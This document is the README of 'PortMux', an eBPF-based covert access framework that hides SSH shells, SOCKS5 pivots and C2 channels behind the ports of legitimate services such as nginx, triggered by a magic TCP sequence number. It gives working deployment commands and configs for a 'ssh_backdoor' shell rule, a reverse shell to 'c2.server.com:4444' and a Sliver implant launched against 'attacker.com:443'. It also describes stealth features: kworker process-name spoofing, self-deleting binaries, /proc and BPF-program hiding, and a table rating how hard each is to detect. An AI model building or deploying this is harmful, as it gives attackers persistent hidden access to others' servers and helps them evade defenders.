# PortMux

基于 eBPF 的 TCP 端口复用隐蔽接入框架。让 SSH / SOCKS5 / 自定义 C2 协议共享 nginx / Go HTTP 等合法服务的端口，内核级透明代理，不修改现有服务，不影响正常流量。

**v3 特性：单 ELF 生成器工作流 —— 编译机产出唯一 `portmux-gen`，运行一次交互生成 N 个互不相同的 server ELF + 1 个 client ELF + 1 个 client.conf，目标机/控制端全程无需源码与编译环境。**

## 目录

- [工作原理](#工作原理)
- [快速开始](#快速开始)
- [编译时配置](#编译时配置)
- [部署指南](#部署指南)
- [配置详解](#配置详解)
- [Handler 文档](#handler-文档)
- [开发指南](#开发指南)
- [隐身分析](#隐身分析)
- [故障排查](#故障排查)
- [TODOLIST](#todolist)

---

## 工作原理

```
控制端 pmux-wrap                      目标机
┌──────────────┐                    ┌──────────────────────────────┐
│ TCP_REPAIR   │                    │  ens18 (网卡)                 │
│ ISN=0x9f9cXX │─────SYN──────────►│    │                         │
└──────────────┘                    │  TC BPF Ingress              │
                                     │  └─ ISN match? → mark        │
正常用户                              │              │               │
┌──────────────┐                   │  iptables PREROUTING nat     │
│ curl / nmap  │───SYN(随机ISN)───►│  └─ mark match? → REDIRECT   │
└──────────────┘                    │              │               │
                                     │  Go Agent                    │
 HTTP/nmap 正常 ◄──────────────── │  └─ accept → peek → route    │
                                     │     ├─ SSH    → shell       │
                                     │     ├─ SOCKS5 → pivot       │
                                     │     └─ HTTP   → proxy nginx │
                                     └──────────────────────────────┘
```

**数据流：**
1. TC BPF 解析 SYN 包的 ISN，匹配 magic → `skb->mark = 0x706d0001`
2. iptables 按 mark 将连接 REDIRECT 到 agent 隐藏端口
3. Agent accept 后 peek 首字节，按指纹分发到对应 handler
4. 不匹配的流量走正常内核路径到 nginx，完全透明

**ISN 派生公式：** `ISN = (SHA256(key)[0:2] << 16) | random_16_bits`

---

## 快速开始

### 编译 (编译机, 一次性)

```bash
git clone <仓库地址> && cd portmux
./build.sh        # 自动装 Go/依赖 → 产出 dist/portmux-gen (唯一 ELF)
```

### 生成 (控制端或任意 Linux 机器)

```bash
scp dist/portmux-gen user@控制端:/tmp/
/tmp/portmux-gen                 # 交互式: [1] 简化版 / [2] 详细版
# 输出: server-<名字>.pm ×N (实例标识互不相同) + portmux-wrap + client.conf
```

### 部署与使用

```bash
# 目标机: 上传生成的 server + server.sh (零配置, 配置已内置二进制尾部)
scp output/server-<名字>.pm dist/server.sh root@target:/opt/portmux/
ssh root@target "cd /opt/portmux && sudo ./server.sh start"   # 检测到内置配置 → 零交互启动

# 控制端: 上传生成的 client (client.conf 驱动菜单)
scp output/portmux-wrap output/client.conf dist/client.sh user@控制端:/tmp/portmux/
ssh user@控制端 "cd /tmp/portmux && sudo ./client.sh"        # 菜单选择目标
# 或: sudo ./portmux-wrap -target <目标名>

# 正常用户: 无感知
curl http://目标机:劫持端口/     # → 原服务正常响应
```

---

## 生成器工作流 (v3)

```
编译机 (一次)                    控制端 (每次部署)                    目标机
┌────────────┐                  ┌───────────────────────┐          ┌─────────────┐
│ ./build.sh │ → dist/          │ ./portmux-gen 交互      │ → scp →  │ server.sh    │
│            │   portmux-gen    │ [1]简化版 / [2]详细版    │          │ start (零交互)│
└────────────┘   (单 ELF)       │ 清单确认 → 生成:         │          └─────────────┘
                                │  server-*.pm ×N (互不相同)│
                                │  portmux-wrap + client.conf│
                                └───────────────────────┘
```

**机制：**
1. `build.sh` 把 agent/wrap 编译成模板，占位标识 `gen0000`，一并 `go:embed` 进 `portmux-gen`；
2. 生成器运行时把每个 server 的 `gen0000` **字节级替换**为随机 8 位十六进制实例标识
   (BPF 程序/map 名/pin 路径全部互不相同)，并把完整目标配置以
   `--PMCFG1-- … --PMEND1--` 块追加到二进制尾部；
3. agent 启动时读取自身尾部配置 (优先级最高)，目标机零参数零配置；
4. 二进制 `-trimpath` 编译，不含编译机任何路径/用户信息。

**简化版 (必填项 + 默认值)：** 目标名、目标地址、劫持端口、magic_key (留空自动随机)。
**详细版 (全部配置)：** 网卡、规则集、加密/超时/并发、隐身项、默认客户端模式。
**批量模式：** `./portmux-gen -batch targets.yaml -out output -yes` (非交互, 见 dist/README.txt)。

---

## 部署指南

> **推荐流程 (编译机 → 生成器 → 目标机, 全程零编译环境):**
>
> ```bash
> # 1. 编译机 (任意有网络的机器): 一键编译唯一产物
> ./build.sh                      # → dist/portmux-gen + dist/{server.sh,client.sh} + tar.gz
>
> # 2. 控制端: 运行生成器 (详细版/简化版交互 + 清单确认)
> scp dist/portmux-gen user@控制端:/tmp/
> /tmp/portmux-gen                # → output/server-*.pm ×N + portmux-wrap + client.conf
>
> # 3. 目标机 (目标端, 无需源码/Go/clang, 只需 root + tc/iptables):
> scp output/server-<名字>.pm dist/server.sh root@目标机:/opt/portmux/
> ssh root@目标机 "cd /opt/portmux && sudo ./server.sh start"   # 内置配置 → 零交互
>
> # 4. 控制端 (控制端, 只需 root):
> scp output/portmux-wrap output/client.conf dist/client.sh user@控制端:/tmp/portmux/
> ssh user@控制端 "cd /tmp/portmux && sudo ./client.sh"        # client.conf 菜单选目标
> ```
>
> 详细说明见 dev_log/05-scripts/工具脚本说明.md

### 前置条件

| 组件 | 要求 | 检查命令 |
|------|------|---------|
| 内核版本 | ≥ 5.4 | `uname -r` |
| BTF | 需要 | `ls /sys/kernel/btf/vmlinux` |
| bpffs | 挂载 | `mount \| grep bpf` |
| iptables | 需要 | `iptables --version` |
| root | 必须 | `sudo whoami` |

### Agent (目标机)

```bash
# 部署
scp build/.pm root@target:/dev/shm/
ssh root@target "/dev/shm/.pm"

# 隐身部署 (自删二进制 + 伪装进程名)
# 在 cmd/agent/config.yaml 中设置:
#   stealth.process_name: "[kworker/u:2]"
#   stealth.self_delete: true
ssh root@target "/dev/shm/.pm"   # 启动后二进制自删，ps 显示为 [kworker/u:2]

# 运行时覆盖 (调试用)
./.pm -config /tmp/debug.yaml
```

### Wrapper (控制端)

```bash
# 直接连接 shell
sudo ./portmux-wrap -target 192.0.2.10:80

# 指定密钥 (需与 agent 编译时的 magic_key 一致)
sudo ./portmux-wrap -target 192.0.2.10:80 -key custom-key

# 对接 SSH 客户端
sudo ./portmux-wrap -target 192.0.2.10:80 \
    -exec /usr/bin/ssh \
    -args 'root@192.0.2.10 -p 80'
```

### 清除

```bash
# 停止 agent
sudo pkill portmux-agent

# 清理内核钩子
sudo tc filter del dev ens18 ingress
sudo iptables -t nat -F PREROUTING
sudo rm -rf /sys/fs/bpf/portmux
```

---

## 配置详解

完整配置见 `config.example.yaml`。下面逐段说明。

### 基础

```yaml
magic_key: "portmux-key-2024"     # ISN 派生密钥，SHA256 前 16bit
```

### 监听配置

```yaml
listen:
  iface: "ens18"                   # 网卡名，TC filter 挂载点
  watch_ports: [80, 443]          # 要劫持的端口列表
```

### 规则

```yaml
rules:
  # 隐蔽接入规则 (priority 1-9)
  - name: ssh_backdoor
    fingerprint: "SSH-2.0"        # ASCII 字面
    handler: shell
    handler_args: { cmd: "/bin/bash" }
    priority: 1

  - name: socks5
    fingerprint_raw: "\x05\x01\x00"  # hex 转义
    handler: socks5
    priority: 2

  - name: reverse_c2
    fingerprint_raw: "\xDE\xAD\xBE\xEF"
    handler: reverse
    handler_args: { connect: "10.0.0.1:4444" }
    priority: 3

  # 透明转发 (priority 10-99)
  - name: http
    fingerprint: "GET "
    handler: tcp_proxy
    handler_args: { target: "127.0.0.1:80" }
    priority: 10

  - name: https
    fingerprint_raw: "\x16\x03"
    handler: tcp_proxy
    handler_args: { target: "127.0.0.1:443" }
    priority: 11

  # 兜底 (priority 100)
  - name: fallback
    fingerprint: "*"              # 通配符
    handler: tcp_proxy
    handler_args: { target: "127.0.0.1:80" }
    priority: 100
```

### fingerprint 格式

| 写法 | 示例 | 匹配字节 |
|------|------|---------|
| ASCII 字面 | `"SSH-2.0"` | `53 53 48 2D 32 2E 30` |
| ASCII 字面 | `"GET "` | `47 45 54 20` |
| hex 转义 | `"\x16\x03"` | `16 03` |
| hex 转义 | `"\xDE\xAD\xBE\xEF"` | `DE AD BE EF` |
| 通配符 | `"*"` | 任意 |

### stealth

```yaml
stealth:
  process_name: "[kworker/u:0]"   # prctl 进程名伪装
  self_delete: false              # 启动后 os.Remove(os.Executable())
```

---

## Handler 文档

### 内置 Handler

| Handler | 参数 | 行为 | 安全研究场景 |
|---------|------|------|---------|
| `shell` | `cmd: "/bin/bash"` | spawn 子进程，pipe IO | 替代 SSH |
| `socks5` | 无 | 在连接上实现 SOCKS5 服务端 | 内网 pivot |
| `tcp_proxy` | `target: "addr:port"` | 双向 `io.Copy` 透传 | HTTP→nginx |
| `reverse` | `connect: "addr:port"` | 收到触发后主动外连 | 绕过防火墙出站限制 |
| `sliver` | `implant_port` 等 | 转发到本地 Sliver implant | C2 框架对接 |

### Shell Handler

```yaml
- fingerprint: "SSH-2.0"
  handler: shell
  handler_args: { cmd: "/bin/bash" }
  priority: 1
```

`exec.Command(cmd)`, stdin/stdout/stderr 管道到 TCP 连接。

### SOCKS5 Handler

```yaml
- fingerprint_raw: "\x05\x01\x00"
  handler: socks5
```

实现 RFC 1928 CONNECT 命令。配合 wrapper 做内网 pivot：

```bash
# 控制端上起 SOCKS5 → 通过目标访问内网
proxychains nmap -sT 10.0.0.0/24
```

### TCP Proxy Handler

```yaml
- fingerprint: "GET "
  handler: tcp_proxy
  handler_args: { target: "127.0.0.1:80" }
```

`net.Dial(target)` → `io.Copy` 双向转发。用于将正常 HTTP/HTTPS 透传给 nginx。

### Reverse Handler

```yaml
- fingerprint_raw: "\xDE\xAD\xBE\xEF"
  handler: reverse
  handler_args: { connect: "c2.server.com:4444" }
```

收到匹配连接后，主动 `net.Dial` 外连并在外连上 spawn shell。一次触发一次反弹。

### Sliver C2 Handler

```yaml
- fingerprint_raw: "\x16\x03\x01"
  handler: sliver
  handler_args:
    implant_port: "31337"           # Sliver implant 本地监听端口
    implant_path: "/tmp/sliver"     # (可选) implant 路径, auto_start 用
    auto_start: "false"             # 自动启动 implant
  priority: 3
```

**工作方式：**
1. 收到匹配连接 (TLS ClientHello 指纹)
2. 如果 `auto_start=true`, 检查/启动 Sliver implant
3. `net.Dial` 到 `127.0.0.1:implant_port`
4. 双向 `io.Copy` 转发

**部署示例：**

```bash
# 目标机上启动 Sliver implant (监听 127.0.0.1:31337)
# portmux 将 mTLS 流量透过 :80 转发给 implant

# 控制端: Sliver operator 连接
# Sliver → C2 profile 指定目标 :80，流量自动路由到 implant
```

**配合 auto_start：**

```yaml
- fingerprint_raw: "\x16\x03\x01"
  handler: sliver
  handler_args:
    implant_port: "31337"
    implant_path: "/dev/shm/sliver.implant"
    auto_start: "true"
    c2_server: "attacker.com:443"
  priority: 1
```

首次触发时自动执行 `/dev/shm/sliver.implant --url attacker.com:443`，之后转发流量。

### 添加自定义 Handler

```go
package handler

import ("context"; "net")

type MyHandler struct { Arg string }

func init() {
    Register("my_custom", func(args map[string]string) (Handler, error) {
        return &MyHandler{Arg: args["my_arg"]}, nil
    })
}

func (h *MyHandler) Name() string { return "my_custom" }
func (h *MyHandler) Handle(ctx context.Context, conn net.Conn) error {
    defer conn.Close()
    // 自定义逻辑
    return nil
}
```

---

## 开发指南

### 目录结构

```
portmux/
├── bpf/
│   ├── common.h              # BPF 类型定义
│   └── portmux.bpf.c         # TC classifier (ISN → mark)
├── cmd/
│   ├── agent/
│   │   ├── main.go           # Agent CLI (唯一 flag: -config)
│   │   └── config.yaml       # ← 编译时嵌入的配置
│   └── wrap/main.go          # ISN 注入 wrapper (TCP_REPAIR)
├── internal/
│   ├── bpf/loader.go         # embed BPF ELF + Maps 管理
│   ├── agent/{agent,router,config}.go
│   ├── handler/{shell,socks5,proxy,reverse,handler}.go
│   └── stealth/process.go
├── pkg/isn/isn.go
├── config.example.yaml       # 配置模板 (不参与编译)
├── Makefile / build.sh
├── go.mod / go.sum
└── README.md
```

### 编译流程

```bash
# 1. BPF C → ELF
clang -target bpf -O2 -c bpf/portmux.bpf.c -o internal/bpf/portmux.bpf.o

# 2. Go 编译 (//go:embed 嵌入 config.yaml + bpf.o)
CGO_ENABLED=0 go build -ldflags="-s -w" -o build/.pm ./cmd/agent/
```

### BPF 关键规则

```c
// 所有路径必须返回 TC_ACT_OK (0)，绝不返回 TC_ACT_SHOT (2)
// 2 = 丢弃全部包 → 网络中断
return 0;
```

### 修改默认值

修改 `internal/agent/config.go` 的 `DefaultConfig()` 函数。YAML 覆盖时只覆盖显式写了字段。

---

## 隐身分析

| 维度 | 机制 | 检测难度 |
|------|------|:---:|
| 进程可见 | `prctl(PR_SET_NAME)` + 零参数启动 | 高 |
| 文件可见 | `os.Remove` 自删 | 高 |
| 端口可见 | 复用已有端口 | 高 |
| 流量特征 | ISN 标准 TCP 字段 | 高 |
| DPI 扫描 | nmap 随机 ISN 不触发 | 高 |
| bpftool | 可见 BPF 程序 (需 root) | 低 |
| iptables -L | 可见 REDIRECT 规则 (需 root) | 低 |

---

## 故障排查

### Agent 启动失败

```bash
# 直接运行看输出
sudo ./.pm

# 常见错误:
# "Parent Qdisc doesn't exists"
# → sudo tc qdisc add dev ens18 clsact
# "operation not permitted"
# → 确认 root 运行
# "could not find BPF maps"
# → 确认 bpffs 已挂载: mount | grep bpf
```

### TC 未生效

```bash
sudo tc filter show dev ens18 ingress | grep bpf
# 如果没有输出 → 手动重建:
sudo tc qdisc add dev ens18 clsact
sudo tc filter add dev ens18 ingress bpf da obj /path/portmux.bpf.o sec classifier
```

### iptables 未重定向

```bash
sudo iptables -t nat -L PREROUTING -n -v
# 检查 REDIRECT 规则的 pkts 计数 > 0
```

### Wrapper 连接失败

```bash
# TCP_REPAIR 需要 root
sudo ./portmux-wrap -target ...

# 确认 magic_key 与 agent 编译时一致
# 确认目标 IP 走的是 ens18 网卡 (非 127.0.0.1)
```

---

## TODOLIST

- [x] TC BPF ISN 检测 + mark
- [x] iptables REDIRECT
- [x] ISN 注入 Wrapper (TCP_REPAIR)
- [x] 编译时配置嵌入 (零参数启动)
- [x] shell / socks5 / proxy / reverse / sliver handler
- [x] 进程名伪装 + 二进制自删
- [x] Sliver C2 bridge
- [x] /proc getdents64 隐藏 (stealth.bpf.c, 失败自动跳过)
- [x] BPF 程序 ID 隐藏 (kprobe __x64_sys_bpf)
- [x] 单 ELF 生成器 (portmux-gen: N 个互不相同 server + client + conf)
- [x] XChaCha20-Poly1305 流加密 (指纹/载荷全程密文)
- [x] 敲门节流 (每源 IP 5 次/60s)
- [ ] 多包敲门触发
- [ ] sk_lookup 零 iptables 模式 (标准内核 ≥5.9; 部分定制内核自动降级 legacy)
